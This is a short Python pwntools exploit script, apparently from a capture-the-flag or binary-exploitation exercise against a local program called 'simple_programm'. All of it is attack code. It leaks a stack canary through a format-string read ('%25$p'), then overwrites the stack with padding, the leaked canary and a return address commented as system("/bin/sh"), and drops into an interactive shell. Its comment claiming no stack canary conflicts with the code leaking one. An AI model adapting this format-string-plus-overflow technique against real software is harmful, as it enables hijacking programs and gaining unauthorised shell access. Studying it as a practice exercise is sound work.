#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./simple_programm')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)    
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
new_addr_ret = 0x000000000040119e # <-- system("/bin/sh")
io.send(b'%25$p|\n')
canary_val = io.recvuntil(b'|')
canary_val = canary_val[0:-1]
canary_val = canary_val.decode()
io.recvuntil(b'\n')
print('canary_val in python_0 = ', canary_val)
canary_val = int(canary_val,16)
print('canary_val in python_1 = ', canary_val)
io.send(b'A' * (100+44) + p64(canary_val) + b'B' * 8 + p64(new_addr_ret))
io.interactive()

